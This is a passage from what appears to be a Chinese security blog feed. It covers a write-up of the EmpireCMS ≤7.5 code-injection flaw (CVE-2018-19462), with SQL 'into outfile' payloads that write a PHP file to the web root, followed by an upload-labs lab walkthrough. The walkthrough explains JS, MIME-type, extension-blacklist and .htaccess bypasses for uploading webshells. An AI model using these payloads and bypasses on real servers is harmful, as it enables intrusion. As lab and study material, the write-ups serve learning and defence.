代码注入(CVE-2018-19462)</h4><blockquote><p>影响版本：帝国CMS(EmpireCMS) &lt;= 7.5</p><p>描述：EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。</p></blockquote><p>漏洞出现页面：</p><p>这里其实是使用了文件引用，引用了文件upload/e/admin/db/DoSql.php</p><p><img src="https://i.loli.net/2021/02/14/DEnAXeTWalSvZR3.png"></p><p>查看DoSql.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExecSql</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$userid</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$empire</span>,<span class="variable">$dbtbpre</span>;</span><br><span class="line"><span class="variable">$id</span>=(<span class="keyword">int</span>)<span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>))</span><br><span class="line">&#123;</span><br><span class="line">printerror(<span class="string">&#x27;EmptyExecSqlid&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$empire</span>-&gt;fetch1(<span class="string">&quot;select sqltext from <span class="subst">&#123;$dbtbpre&#125;</span>enewssql where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$r</span>[<span class="string">&#x27;sqltext&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">printerror(<span class="string">&#x27;EmptyExecSqlid&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$query</span>=RepSqlTbpre(<span class="variable">$r</span>[<span class="string">&#x27;sqltext&#x27;</span>]);<span class="comment">#sqltext是上图表格上传的内容，经RepSqlTbpre处理</span></span><br><span class="line">DoRunQuery(<span class="variable">$query</span>);<span class="comment">#对$query处理</span></span><br><span class="line"><span class="comment">//操作日志</span></span><br><span class="line">insert_dolog(<span class="string">&quot;query=&quot;</span>.<span class="variable">$query</span>);</span><br><span class="line">printerror(<span class="string">&quot;DoExecSqlSuccess&quot;</span>,<span class="string">&quot;ListSql.php&quot;</span>.hReturnEcmsHashStrHref2(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$query=RepSqlTbpre($r[&#39;sqltext&#39;]);</code>：<br>sqltext就是网页中表格上传的内容，在函数ExecSql()中由RepSqlTbpre()处理</p><p>再来看一下RepSqlTbpre():</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RepSqlTbpre</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;<span class="comment">#利用str_replace()将表的前缀进行替换</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$dbtbpre</span>;</span><br><span class="line"><span class="variable">$sql</span>=str_replace(<span class="string">&#x27;[!db.pre!]&#x27;</span>,<span class="variable">$dbtbpre</span>,<span class="variable">$sql</span><span class="comment">#将表的前缀进行替换</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DoRunQuery($query);</code>：对$query处理（去除空格）,用<code>;</code>分割然后遍历，无其他限制or过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DoRunQuery</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$empire</span>;</span><br><span class="line"><span class="variable">$sql</span>=str_replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;\n&quot;</span>,<span class="variable">$sql</span>);<span class="comment">#将$sql中的&quot;\r&quot;以&quot;\n&quot;替换</span></span><br><span class="line"><span class="variable">$ret</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$num</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span>(explode(<span class="string">&quot;;\n&quot;</span>,trim(<span class="variable">$sql</span>)) <span class="keyword">as</span> <span class="variable">$query</span>)&#123;<span class="comment">#以;分割再遍历</span></span><br><span class="line">    <span class="comment">#explode使用一个字符串切割另一个字符串，并返回数组。这里使用&quot;;\n&quot; 切割 trim($sql)</span></span><br><span class="line"><span class="variable">$queries</span>=explode(<span class="string">&quot;\n&quot;</span>,trim(<span class="variable">$query</span>));<span class="comment">#trim()去除字符串首尾空白</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$queries</span> <span class="keyword">as</span> <span class="variable">$query</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="variable">$num</span>].=<span class="variable">$query</span>[<span class="number">0</span>]==<span class="string">&#x27;#&#x27;</span>||<span class="variable">$query</span>[<span class="number">0</span>].<span class="variable">$query</span>[<span class="number">1</span>]==<span class="string">&#x27;--&#x27;</span>?<span class="string">&#x27;&#x27;</span>:<span class="variable">$query</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$ret</span> <span class="keyword">as</span> <span class="variable">$query</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$query</span>=trim(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$query</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$empire</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由此可执行恶意的sql语句</p><p>构造payload：(outfile、dumpfile)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php phpinfo(); ?&gt;&quot; <span class="keyword">into</span> outfile &quot;D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php&quot;</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php phpinfo(); ?&gt;&quot; <span class="keyword">into</span> dumpfile &quot;D:\\phpstudy_pro\\WWW\\empirecms\\myinfo.php&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/r3WmvflGnU9kVD7.png" alt="将语句输入其中"></p><p>执行成功，可以看到成功写入myinfo.php<br><img src="https://i.loli.net/2021/02/14/afoZG4bF6jCXKx8.png" alt="执行成功，成功写入myinfo.php"></p><p>访问即可触发：<br><img src="https://i.loli.net/2021/02/14/DBmZWKXjVf6YiGx.png"></p><p>如果不行的话可能是mysql安全限制的原因</p><blockquote><p><code>secure_file_priv</code>参数：查看具有写权限的目录</p><ul><li>当secure_file_priv的值为<code>null </code>，表示限制mysqld 不允许导入|导出</li><li>当secure_file_priv的值<code>没有具体值</code>时（=””），表示不对mysqld 的导入|导出做限制</li><li>当secure_file_priv的值为<code>/tmp/ </code>，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li></ul></blockquote><p>修改<code>secure_file_priv</code>参数为空，如下；保存重启mysql即可<br><img src="https://i.loli.net/2021/02/14/UPoT3sOjrF6i5MK.png"></p>]]></content>
      
      
      <categories>
          
          <category> cms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs靶场通关小记</title>
      <link href="2021/02/12/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/"/>
      <url>2021/02/12/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近年了又忙又爱玩哈哈，之前的计划学习搁置了好多</p><p>这里是upload-labs的记录，上学期做过了但写的不是很详细，知识点也不是非常清晰，这次重新做一遍详细记录一下</p><p>大致思路如下，ps：除此之外还可能存在检查php标记&lt;?，这时候用其他的标记就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps：php手册中的四种php标记：</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;% %&gt;</span><br><span class="line"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span>:要使用 <span class="meta">&lt;?</span> <span class="meta">?&gt;</span> 短标记,必须开启php.ini中的short_open_tag指令</span><br><span class="line">    </span><br><span class="line">PHP 有一个 <span class="keyword">echo</span> 标记简写 <span class="meta">&lt;?=</span>， 它是更完整的 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> 的简写形式：</span><br><span class="line"><span class="meta">&lt;?=</span> <span class="string">&#x27;print this string&#x27;</span> <span class="meta">?&gt;</span> === <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;print this string&#x27;</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/NYtQUAPus7TxGbR.png" alt="官方的tips"><img src="https://i.loli.net/2021/02/13/JuaItBbjfo9zws8.png" alt="思路"></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="pass1（客户端-js检查）"><a href="#pass1（客户端-js检查）" class="headerlink" title="pass1（客户端-js检查）"></a>pass1（客户端-js检查）</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先随便上传一下~看到弹窗，f12一下能看到提交时的js验证，要求上传jpg、png、gif类型的文件（算是前端的白名单吧）</p><p><img src="https://i.loli.net/2021/02/13/2D5qPnpJdzSa4jf.png"></p><p>客户端检查：上传非法文件，返回速度较快~</p><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><h4 id="1、禁用js"><a href="#1、禁用js" class="headerlink" title="1、禁用js"></a>1、禁用js</h4><h5 id="a、burpsuite抓包删除所有js再发包"><a href="#a、burpsuite抓包删除所有js再发包" class="headerlink" title="a、burpsuite抓包删除所有js再发包~"></a>a、burpsuite抓包删除所有js再发包~</h5><p><img src="https://i.loli.net/2021/02/13/FVlo1XSy2cizU9r.png"></p><p><img src="https://i.loli.net/2021/02/13/qRKdL5maXcxeP3H.png" alt="删除前"></p><p><img src="https://i.loli.net/2021/02/13/fFNXHBO92mGStZk.png" alt="删除后"></p><p>可以看到删除后所有js都被删掉了，这时候上传咱们的🐎就可以了</p><h5 id="b、浏览器禁用js"><a href="#b、浏览器禁用js" class="headerlink" title="b、浏览器禁用js"></a>b、浏览器禁用js</h5><p>如图是chorme禁用js的页面，edge和chorme类似（毕竟用的chorme内核）</p><p><img src="https://i.loli.net/2021/02/13/et3XBcxvV6UuaJw.png" alt="chorme设置-搜索-javascript"></p><h4 id="2、将🐎后缀名改为允许的格式，抓包改回来即可"><a href="#2、将🐎后缀名改为允许的格式，抓包改回来即可" class="headerlink" title="2、将🐎后缀名改为允许的格式，抓包改回来即可"></a>2、将🐎后缀名改为允许的格式，抓包改回来即可</h4><p><img src="https://i.loli.net/2021/02/13/b8IM9rWXjLPNxQt.png" alt="2021021100205737.png"></p><p>最后右键打开就能得到上传文件的路径了，蚁剑连接即可</p><p>（找路径很有讲究==——自某次找错路径绕了三天的经历、）</p><p><img src="https://i.loli.net/2021/02/13/PpDkXby6grBmaed.png"></p><h2 id="pass2（MIME-Type验证）"><a href="#pass2（MIME-Type验证）" class="headerlink" title="pass2（MIME-Type验证）"></a>pass2（MIME-Type验证）</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>老样☞，先上传🐎，然而被无情的驳回</p><p><img src="https://i.loli.net/2021/02/13/CO4QZnmFEVw8Grz.png"></p><p>根据思路，看一下是检查后缀名，还是检查内容（或者都检查–）</p><p>这里准备了拥有相同内容<code>&lt;?php phpinfo(); ?&gt;</code>,但类型不同的🐎（文件后缀不同）</p><p><strong>也就是判断是否能够上传图片类型，非图片内容的文件</strong></p><p><img src="https://i.loli.net/2021/02/13/1ODwIoL2xR3WFfv.png"></p><p>刚才php类型上传失败了，现在咱们上传jpg类型的试试</p><p><img src="https://i.loli.net/2021/02/13/UY6eEcIPXFDVzOL.png"></p><p>显然是可以的</p><p>但是打开却不显示phpinfo，</p><p>是因为php不会对图片进行解析，后面的图片马也是一样，需要搭配文件包含漏洞使用</p><p>（或者修改配置使得图片也能解析）详情看后文</p><p><img src="https://i.loli.net/2021/02/13/WbiL8XVsZH49rDG.png"></p><p>然后抓包看一下，二者的差别在于后缀名，还有Content-Type</p><p><img src="https://i.loli.net/2021/02/13/cKYluSLhsoFX9RH.png" alt="20210211003858612.png"></p><p>将info.php改为info.jpg，报错</p><p>再尝试将content-type改为图片形式：<code>image/jpeg</code>成功！</p><h3 id="bypass-1"><a href="#bypass-1" class="headerlink" title="bypass"></a>bypass</h3><p>将传入的🐎抓包修改content-type为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>，放包即可</p><p>源码（附解析）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<span class="comment">#file_exists — 检查文件或目录是否存在</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;<span class="comment">#检查文件MIME类型是否为这三种，是则为文件名和上传路径赋值，从而使得move_uploaded_file()为真，上传成功</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">#move_uploaded_file() - 将上传的文件移动到新位置</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关于MIME-Type的小知识：</strong></p><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><p><strong>关于$_FILES的小知识：</strong></p><p><img src="https://i.loli.net/2021/02/13/eUsimQBMdZ3rX7v.png" alt="$_FILES数组内容"></p><h2 id="pass3（黑名单-后缀名）"><a href="#pass3（黑名单-后缀名）" class="headerlink" title="pass3（黑名单-后缀名）"></a>pass3（黑名单-后缀名）</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>上传一个🐎，tips:不允许上传.asp,.aspx,.php,.jsp后缀文件！</p><p>也就是说黑名单中都不能上传lo，<strong>只针对黑名单中没有的后缀名，文件才能上传成功</strong></p><p><img src="https://i.loli.net/2021/02/13/otYfysrCXbOJKzV.png"></p><h3 id="bypass-2"><a href="#bypass-2" class="headerlink" title="bypass"></a>bypass</h3><p>1、黑名单不全</p><p>诸如php1、php5、phtml这些都可以上传，使用这类的后缀名就行了（前提是能够解析，不然上传也没意义）</p><p>这里文件上传后名字会被更改。</p><p>注意中间件对不同文件类型的解析问题（一般是配置问题），不然就会出现上传成功却无法利用的情况</p><p><img src="https://i.loli.net/2021/02/13/qHMEu6g7Qiv9KZO.png"></p><p>此处因为环境是用phpstudy搭建的，就无法解析php5，修改一下httpd.conf~</p><p>添加如下内容：<code>AddType application/x-httpd-php .php .phtml .php1 .php2 .php3 .php4 .php5</code>再重启一下即可</p><p>不过我再访问却是让我下载这个文件。。显然解析出问题了QAQ</p><p>2、此处没有过滤.htaccess，可以上传<code>.htaccess</code>文件（内容为<code>SetHandler application/x-httpd-php</code>），从而将所有文件解析为php。（具体看第四关~）</p><p>源码：</p><p>一般黑名单验证可以尝试</p><p>‘.’号（如：<code>a.php.</code>）、大小写（如PhP）、特殊字符（如：1.php::$DATA）、Apache后缀解析（.php.xxx为.php）等等</p><blockquote><p>windows在创建文件时会删除后缀名后的.和空格，并且后缀名为php.的文件也是可以当作php解析的（windows和linux环境都可以）</p></blockquote><p>但这些在源码中都ban了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);<span class="comment">#trim();去掉字符串两端多余空格</span></span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment"># deldot();删除文件名末尾的点；‘.’号（如：`a.php.`）</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment"># strrchr();从删除&quot;.&quot;的位置开始删除 “xxx.php.xxx”删除.xxx；</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment"># strtolower();；大小写（如PhP）</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pass4（黑名单-htaccess）"><a href="#pass4（黑名单-htaccess）" class="headerlink" title="pass4（黑名单-.htaccess）"></a>pass4（黑名单-.htaccess）</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>ban：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到禁用了更多类型，但没有禁用<code>.htaccess</code>，那么就可以先上传<code>.htaccess</code>，在上传木马~</p><h4 id="关于-htaccess："><a href="#关于-htaccess：" class="headerlink" title="关于.htaccess："></a>关于<code>.htaccess</code>：</h4><p><strong>条件：</strong></p><p>php5.6以下不带nts的版本</p><p>服务器没有禁止.htaccess文件的上传，且服务商允许用户使用自定义.htaccess文件</p><p><strong>利用方式：</strong></p><p>上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。</p><p><strong>关于.htaccess文件内容：</strong></p><p>.htaccess文件解析规则的增加，是可以按照组合的方式去做的，具体需要自己多测试一下。</p><p>第一种、虽然好用，但是会误伤其他正常文件，动静大容易被发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mime_module&gt;</span><br><span class="line"></span><br><span class="line">AddHandler php5-script .gif     #在当前目录下，只针对gif文件会解析成php代码执行</span><br><span class="line">SetHandler application&#x2F;x-httpd-php  #在当前目录下，所有文件都会被解析成php代码执行</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><p>第二种、同1没太大区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mime_module&gt;</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .gif</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><p>第三种、精确控制能被解析成php代码的文件，比较隐蔽<br>evil.gif即为上传的🐎名称+后缀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;evil.gif&quot;&gt; #当前目录下，若匹配到evil.gif文件，则被解析成PHP代码执行</span><br><span class="line"></span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">AddHandler php5-script .gif    </span><br><span class="line"></span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch 